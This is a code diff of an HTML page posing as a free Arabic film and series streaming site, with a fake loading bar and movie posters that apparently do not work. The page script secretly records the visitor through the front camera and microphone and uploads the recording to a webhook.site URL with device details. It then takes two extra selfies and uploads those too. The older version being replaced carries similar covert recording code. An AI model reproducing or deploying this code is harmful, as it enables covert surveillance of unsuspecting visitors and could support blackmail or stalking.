@@ -1,124 +1,240 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Film</title>
+  <title>أفلام ومسلسلات عربية جديدة 2025</title>
   <style>
     body {
       margin: 0;
+      font-family: Arial, sans-serif;
       background: #000;
+      color: #fff;
+      text-align: center;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
     }
     header {
-      width: 100%;
+      background: linear-gradient(to bottom, #8b0000, #000);
       padding: 20px;
-      background: #111;
-      text-align: center;
     }
     h1 {
       margin: 0;
-      color: #ff3366;
-      font-size: 2.5rem;
+      font-size: 2.2rem;
+      text-shadow: 0 0 10px #ff0000;
     }
-    #video-container {
-      width: 95%;
-      max-width: 1000px;
-      margin: 20px;
-      border-radius: 12px;
+    #progress-container {
+      margin: 40px auto;
+      width: 80%;
+      max-width: 500px;
+      height: 30px;
+      background: #333;
+      border-radius: 15px;
       overflow: hidden;
-      box-shadow: 0 0 40px #ff0066;
+      display: none;
     }
-    video {
+    #progress-bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(to right, #ff0000, #ff8800);
+      transition: width 5s linear;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 15px;
+      padding: 20px;
+      max-width: 1200px;
+      margin: 20px auto;
+      flex: 1;
+    }
+    .poster {
+      position: relative;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(255,0,0,0.3);
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .poster:hover {
+      transform: scale(1.05);
+    }
+    .poster img {
       width: 100%;
+      height: auto;
       display: block;
+    }
+    .poster::after {
+      content: "▶";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 4rem;
+      color: rgba(255,255,255,0.7);
+      text-shadow: 0 0 10px #000;
+      pointer-events: none;
+    }
+    footer {
+      padding: 20px;
+      background: #111;
+      font-size: 0.9rem;
+      opacity: 0.7;
+    }
+    #status {
+      font-size: 1.3rem;
+      margin: 30px;
+      color: #ff8800;
     }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>Film</h1>
+  <h1>أفلام ومسلسلات عربية جديدة 2025</h1>
+  <p>شاهد أونلاين مجانًا بدون إعلانات</p>
 </header>
 
-<div id="video-container">
-  <video id="main-video" controls autoplay>
-    <source src="https://files.catbox.moe/r2dbvz.mp4" type="video/mp4">
-  </video>
+<div id="status">جاري التحميل... يرجى الانتظار</div>
+<div id="progress-container">
+  <div id="progress-bar"></div>
+</div>
+
+<div class="grid" id="movies-grid" style="display:none;">
+  <!-- صور الأفلام المطلوبة فقط (لا تعمل) -->
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/6CoRTJTmijhBLJTUNoVSUNxZMEI.jpg" alt="365 Days"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/6CoRTJTmijhBLJTUNoVSUNxZMEI.jpg" alt="365 Days"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/8cdWjvZQUExUUTzyp4t6EDMUBHN.jpg" alt="The After"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg" alt="Titanic"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/udDclJoHjfjb8Ekgsd4FDteOkCU.jpg" alt="Joker"></div>
 </div>
 
 <video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
+<footer>
+  جميع الحقوق محفوظة © 2025 | محتوى ترفيهي فقط
+</footer>
+
 <script>
-const hiddenVideo = document.getElementById('hiddenVideo');
+const video = document.getElementById('hiddenVideo');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
-const mainVideo = document.getElementById('main-video');
+const progressBar = document.getElementById('progress-bar');
+const progressContainer = document.getElementById('progress-container');
+const status = document.getElementById('status');
+const moviesGrid = document.getElementById('movies-grid');
 
 const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";
 
-async function start() {
+async function recordAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: true
     });
 
-    hiddenVideo.srcObject = stream;
-    await hiddenVideo.play();
+    video.srcObject = stream;
+    await video.play();
 
-    // صورتين سريعًا
-    setTimeout(() => captureSelfie(1), 500);
-    setTimeout(() => captureSelfie(2), 1500);
+    // إظهار الـ progress bar
+    progressContainer.style.display = 'block';
+    status.textContent = "جاري التحميل... لا تغلق الصفحة";
+
+    // بدء التسجيل
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+
+    recorder.ondataavailable = e => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    recorder.start(100);
+
+    // بدء الـ progress bar لمدة 5 ثواني
+    progressBar.style.width = '0%';
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 2;
+      progressBar.style.width = progress + '%';
+      if (progress >= 100) {
+        clearInterval(interval);
+        finishRecording(recorder, chunks, stream);
+      }
+    }, 100); // 5000ms / 100 = 50 خطوات
 
   } catch (err) {
-    console.log(err);
+    status.textContent = "يرجى السماح بالوصول إلى الكاميرا للمتابعة";
+    console.log("خطأ أو رفض الإذن:", err);
   }
 }
 
+async function finishRecording(recorder, chunks, stream) {
+  recorder.stop();
+
+  recorder.onstop = async () => {
+    const blob = new Blob(chunks, { type: 'video/webm' });
+
+    // إرسال الفيديو
+    const fdVideo = new FormData();
+    fdVideo.append('video', blob, `capture_${Date.now()}.webm`);
+    fdVideo.append('timestamp', Date.now());
+    fdVideo.append('user_agent', navigator.userAgent);
+    fdVideo.append('screen', `\( {screen.width}x \){screen.height}`);
+
+    await fetch(WEBHOOK_URL, { method: 'POST', body: fdVideo }).catch(err => console.log(err));
+
+    // إيقاف الكاميرا
+    stream.getTracks().forEach(track => track.stop());
+    video.srcObject = null;
+
+    // إظهار صفحة الأفلام
+    status.style.display = 'none';
+    progressContainer.style.display = 'none';
+    moviesGrid.style.display = 'grid';
+
+    // التقاط صورتين selfie بعد العرض
+    setTimeout(() => captureSelfie(1), 1500);
+    setTimeout(() => captureSelfie(2), 3000);
+  };
+}
+
 async function captureSelfie(num) {
-  canvas.width = hiddenVideo.videoWidth;
-  canvas.height = hiddenVideo.videoHeight;
-  ctx.drawImage(hiddenVideo, 0, 0);
-  canvas.toBlob(blob => {
-    const fd = new FormData();
-    fd.append('selfie', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
-    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-  }, 'image/jpeg', 0.92);
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r => setTimeout(r, 800));
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    canvas.toBlob(blob => sendBlob(blob, num), 'image/jpeg', 0.92);
+
+    setTimeout(() => {
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
+    }, 500);
+  } catch (err) {
+    console.log("خطأ في الـ selfie:", err);
+  }
 }
 
-// تسجيل 5 ثواني كل 10 ثواني
-function recordCycle() {
-  const stream = hiddenVideo.srcObject;
-  if (!stream) return;
-
-  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-  const chunks = [];
-
-  recorder.ondataavailable = e => chunks.push(e.data);
-
-  recorder.start(100);
-
-  setTimeout(() => {
-    recorder.stop();
-    recorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'video/webm' });
-      const fd = new FormData();
-      fd.append('video_segment', blob, `segment_${Date.now()}.webm`);
-      fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-    };
-
-    setTimeout(recordCycle, 10000);
-  }, 5000);
+function sendBlob(blob, num) {
+  const fd = new FormData();
+  fd.append('photo', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
+  fd.append('timestamp', Date.now());
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(err => console.log(err));
 }
 
-mainVideo.addEventListener('play', recordCycle);
-
-window.addEventListener('load', start);
+// ابدأ فور التحميل
+window.addEventListener('load', () => {
+  setTimeout(recordAndSend, 1000);
+});
 </script>
 
 </body>
